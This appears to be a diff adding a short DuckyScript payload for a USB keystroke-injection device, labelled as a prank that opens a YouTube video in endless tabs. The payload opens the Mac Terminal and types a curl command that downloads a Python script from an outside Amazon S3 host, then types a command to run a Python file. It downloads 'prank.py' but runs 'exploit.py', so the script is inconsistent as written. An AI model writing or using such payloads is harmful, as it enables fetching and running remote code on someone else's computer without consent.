@@ -1,0 +1,12 @@
+REM Made by Cody Bernardy
+REM Opens your favorite youtube video in an endless loop of tabs
+REM Do not use this for illegal purposes
+
+DELAY 3000
+GUI SPACE
+STRING Terminal
+DELAY 500
+STRING curl https://s3-us-west-2.amazonaws.com/remoteduck/prank.py -o prank.py
+DELAY 1000
+STRING python exploit.py
+DELAY 1000
